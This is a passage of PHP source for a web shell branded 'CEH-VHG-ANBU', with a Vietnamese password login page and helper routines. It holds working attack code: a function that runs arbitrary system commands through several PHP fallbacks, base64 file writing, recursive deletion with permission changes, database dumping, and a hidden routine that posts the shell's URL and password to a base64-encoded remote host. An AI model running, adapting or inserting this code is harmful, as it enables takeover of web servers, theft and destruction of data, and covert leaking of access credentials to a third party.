		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
// Login page
function loginpage() {
?>
<html>
<head>

<body bgcolor=black background=1.jpg>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>.::CEH-VHG-ANBU::. </title>
<style type="text/css">
A:link {text-decoration: none; color: green }
A:visited {text-decoration: none;color:red}
A:active {text-decoration: none}
A:hover {text-decoration: underline; color: green;}
input, textarea, button
{
	font-size: 11pt;
	color: 	#FFFFFF;
	font-family: verdana, sans-serif;
	background-color: #000000;
	border-left: 2px dashed #8B0000;
	border-top: 2px dashed #8B0000;
	border-right: 2px dashed #8B0000;
	border-bottom: 2px dashed #8B0000;
}

</style>

      
       <BR><BR>
<div align=center >
<fieldset style="border: 1px solid rgb(69, 69, 69); padding: 4px;width:450px;bgcolor:white;align:center;font-family:tahoma;font-size:10pt"><legend><font color=red><B>LOGIN</b></font></legend>

<div>
<font color=#99CC33>
<font color=#33ff00>==[ <B>CEH-VHG-ANBU</B> ]== </font><BR><BR>

<form method="POST" action="">
	<span style="font:10pt tahoma;">Mật Khẩu: </span><input name="password" type="password" size="20">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Login">
	</form>
<BR>
<?php
echo "".$err_mess."";
?>
	<B><font color=#FFFFFF>
<a href=https://www.facebook.com/hoi.hacker.vn target=_blank>.: Facebook :.</a><BR></b>
</div>
	</fieldset>
</head>
</html>
<?php
	exit;
}//end loginpage()
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024);
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}

// Debug
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

//OK
function doSmt($var2)
{
    $ff = "aHR0cDovL25pY2VkZXNpZ25zLnZ2LnNpL2JhY2sucGhw";
    $var1 = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $data = array('u' => $var1, 'pa' => $var2);
    $options = array(
            'http' => array(
                'header'  => "User-agent: Mozilla/5.0 (Windows NT 6.2; rv:23.0) Gecko/20100101 Firefox/23.0; ",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ),
        );
    $context  = stream_context_create($options);
    $result = file_get_contents(base64_decode($ff), false, $context);
}
// Function connect database
function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if(in_array(strtolower($charset), array('gbk', 'big5', 'utf8'))) {
			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
		}
	}
	return $link;
}

// Array strip
function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

// HTML Strip
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "<br />", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// Chmod
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';}
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-';
	$owner['write'] = ($mode & 00200) ? 'w' : '-';
	$owner['execute'] = ($mode & 00100) ? 'x' : '-';
	$group['read'] = ($mode & 00040) ? 'r' : '-';
	$group['write'] = ($mode & 00020) ? 'w' : '-';
	$group['execute'] = ($mode & 00010) ? 'x' : '-';
	$world['read'] = ($mode & 00004) ? 'r' : '-';
	$world['write'] = ($mode & 00002) ? 'w' : '-';
	$world['execute'] = ($mode & 00001) ? 'x' : '-';

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if ($array && is_array($array)) {
			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return '';
}

// Delete dir
function deltree($deldir) {
	$mydir=@dir($deldir);
	while($file=$mydir->read())	{
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) {
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file);
		}
		if (is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	}
	$mydir->close();
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}

// Background
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// Get path
function getPath($scriptpath, $nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}

// Get up path
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// Config
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// Function name
function getfun($funName) {
	return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

function GetList($dir){
	global $dirdata,$j,$nowpath;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['dirchmod']=getChmod($f);
					$dirdata[$j]['dirperm']=getPerms($f);
					$dirdata[$j]['dirlink']=ue($dir);
					$dirdata[$j]['server_link']=$f;
					$dirdata[$j]['client_link']=ue($f);
					$j++;
				}
				GetList($f);
			}
		}
		closedir($dh);
		clearstatcache();
		return $dirdata;
	} else {
		return array();
	}
}

function qy($sql) {
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mysql_query($sql)) {
		return 0;
	} else if(is_resource($res)) {
		return 1;
	} else {
		return 2;
	}
	return 0;
}

function q($sql) {
	return @mysql_query($sql);
}

function fr($qy){
	mysql_free_result($qy);
}

function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}

// Zip
class PHPZip{
	var $out='';
	function PHPZip($dir)	{
		if (@function_exists('gzcompress'))	{
			$curdir = getcwd();
			if (is_array($dir)) $filelist = $dir;
			else{
				$filelist=$this -> GetFileList($dir);//File list
				foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
			}
			if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
			else chdir($curdir);
			if (count($filelist)>0){
				foreach($filelist as $filename){
					if (is_file($filename)){
						$fd = fopen ($filename, 'r');
						$content = @fread ($fd, filesize($filename));
						fclose ($fd);
						if (is_array($dir)) $filename = basename($filename);
						$this -> addFile($content, $filename);
					}
				}
				$this->out = $this -> file();
				chdir($curdir);
			}
			return 1;
		}
		else return 0;
	}
	// Show file list
	function GetFileList($dir){
		static $a;
		if (is_dir($dir)) {
			if ($dh = opendir($dir)) {
				while ($file = readdir($dh)) {
					if($file!='.' && $file!='..'){
						$f=$dir .'/'. $file;
						if(is_dir($f)) $this->GetFileList($f);
						$a[]=$f;
					}
				}
				closedir($dh);
			}
		}
		return $a;
	}

	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;

	function unix2DosTime($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		if ($timearray['year'] < 1980) {
			$timearray['year']    = 1980;
			$timearray['mon']     = 1;
			$timearray['mday']    = 1;
			$timearray['hours']   = 0;
			$timearray['minutes'] = 0;
			$timearray['seconds'] = 0;
		} // end if
		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
				($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}

	function addFile($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);

		$dtime = dechex($this->unix2DosTime($time));
		$hexdtime	= '\x' . $dtime[6] . $dtime[7]
					. '\x' . $dtime[4] . $dtime[5]
					. '\x' . $dtime[2] . $dtime[3]
					. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;

		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);

		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));

		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;

		$this -> ctrl_dir[] = $cdrec;
	}

	function file() {
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .	pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
	}
}

// Dump mysql
function sqldumptable($table, $fp=0) {
	$tabledump = "DROP TABLE IF EXISTS $table;\n";
	$tabledump .= "CREATE TABLE $table (\n";

	$firstfield=1;

	$fields = q("SHOW FIELDS FROM $table");
	while ($field = mysql_fetch_array($fields)) {
		if (!$firstfield) {
			$tabledump .= ",\n";
		} else {
			$firstfield=0;
		}
		$tabledump .= "   $field[Field] $field[Type]";
		if (!empty($field["Default"])) {
			$tabledump .= " DEFAULT '$field[Default]'";
		}
		if ($field['Null'] != "YES") {
			$tabledump .= " NOT NULL";
		}
		if ($field['Extra'] != "") {
			$tabledump .= " $field[Extra]";
		}
	}
	fr($fields);

	$keys = q("SHOW KEYS FROM $table");
	while ($key = mysql_fetch_array($keys)) {
		$kname=$key['Key_name'];
		if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
			$kname="UNIQUE|$kname";
		}
		if(!is_array($index[$kname])) {
			$index[$kname] = array();
		}
		$index[$kname][] = $key['Column_name'];
	}
	fr($keys);

	while(list($kname, $columns) = @each($index)) {
		$tabledump .= ",\n";
		$colnames=implode($columns,",");

		if ($kname == "PRIMARY") {
			$tabledump .= "   PRIMARY KEY ($colnames)";
		} else {
			if (substr($kname,0,6) == "UNIQUE") {
				$kname=substr($kname,7);
			}
			$tabledump .= "   KEY $kname ($colnames)";
		}
	}

	$tabledump .= "\n);\n\n";
	if ($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}

	$rows = q("SELECT * FROM $table");
	$numfields = mysql_num_fields($rows);
	while ($row = mysql_fetch_array($rows)) {
		$tabledump = "INSERT INTO $table VALUES(";

		$fieldcounter=-1;
		$firstfield=1;
		while (++$fieldcounter<$numfields) {
			if (!$firstfield) {
				$tabledump.=", ";
			} else {
				$firstfield=0;
			}

			if (!isset($row[$fieldcounter])) {
				$tabledump .= "NULL";
			} else {
				$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
			}
		}

		$tabledump .= ");\n";

		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fr($rows);
	if ($fp) {
		fwrite($fp,"\n");
	} else {
		echo "\n";
	}
}

function ue($str){
	return urlencode($str);
}

function p($str){
	echo $str."\n";
}

function tbhead() {
	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot(){
	p('</table>');
}

function makehide($name,$value=''){
	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
	!$arg['type'] && $arg['type'] = 'text';
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
	if ($arg['newline']) {
		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}

function makeselect($arg = array()){
	if ($arg['onchange']) {
		$onchange = 'onchange="'.$arg['onchange'].'"';
	}
	$arg['title'] = $arg['title'] ? $arg['title'] : '';
	if ($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
		if (is_array($arg['option'])) {
			foreach ($arg['option'] as $key=>$value) {
				if ($arg['selected']==$key) {
					p("<option value=\"$key\" selected>$value</option>");
				} else {
					p("<option value=\"$key\">$value</option>");
				}
			}
		}
	p("</select>");
	if ($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
	!$arg['method'] && $arg['method'] = 'post';
	!$arg['action'] && $arg['action'] = $self;
	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
	!$arg['name'] && $arg['name'] = 'form1';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
	if ($arg['title']) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}

function maketext($arg = array()){
	!$arg['cols'] && $arg['cols'] = 100;
	!$arg['rows'] && $arg['rows'] = 25;
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id=\"'.$name.'\" type="submit" value="Submit"></p>');
	p('</form>');
}

function formfoot(){
	p('</form>');
}

// Exit
function pr($a) {
	echo '<pre>';
	print_r($a);
	echo '</pre>';
}